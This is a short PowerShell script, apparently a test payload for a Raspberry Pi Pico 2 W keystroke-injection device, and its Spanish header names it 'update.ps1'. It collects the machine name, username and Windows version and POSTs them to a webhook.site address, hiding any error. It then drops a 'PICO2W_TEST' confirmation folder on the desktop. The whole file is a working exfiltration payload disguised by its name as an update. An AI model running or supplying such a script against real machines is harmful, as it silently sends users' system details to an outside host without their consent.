# --- ESTE ES EL CONTENIDO DE update.ps1 ---
$webhook = 'https://webhook.site/3fa59b0e-4157-4c9e-a72b-4803657bd464'

$info = [ordered]@{
    Tipo           = 'PICO2W_TEST'
    Equipo         = $env:COMPUTERNAME
    Usuario        = $env:USERNAME
    Windows        = (Get-CimInstance Win32_OperatingSystem).Caption
    Version        = (Get-CimInstance Win32_OperatingSystem).Version
    FechaHora      = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}

$mensaje = $info | ConvertTo-Json -Compress

# Enviar datos al Webhook
try {
    Invoke-WebRequest -UseBasicParsing -Uri $webhook -Method POST -ContentType 'application/json; charset=utf-8' -Body $mensaje | Out-Null
} catch {}

# Crear carpeta en el escritorio para confirmar
$path = "$env:USERPROFILE\Desktop\PICO2W_TEST"
if (!(Test-Path $path)) { New-Item -Path $path -ItemType Directory }
"Prueba Exitosa" | Set-Content "$path\resultado.txt"
